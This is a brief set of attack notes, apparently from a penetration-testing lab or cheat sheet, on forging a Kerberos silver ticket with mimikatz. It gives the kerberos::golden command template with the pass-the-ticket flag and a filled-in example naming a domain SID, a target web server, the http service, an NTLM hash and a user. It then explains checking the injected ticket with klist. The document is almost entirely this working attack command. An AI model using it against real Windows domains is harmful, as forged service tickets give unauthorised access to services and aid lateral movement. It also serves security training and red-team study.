#After initiating a mimikatz session and upgrade our token privilege we introduce the follwing command:

kerberos::golden /sid:<useridentifier> /domain:<domain> /ptt /target:<targetname> /service:<service> /rc4:<NTLMHashofSPN> /user:<username>

#For example; kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

#With this, mimikatz will add to our session the Silver Ticket as default credentials. This can be checked with 'klist'. In some cases with certains tools we will have to use the "-UseDefaultCredentials" option.


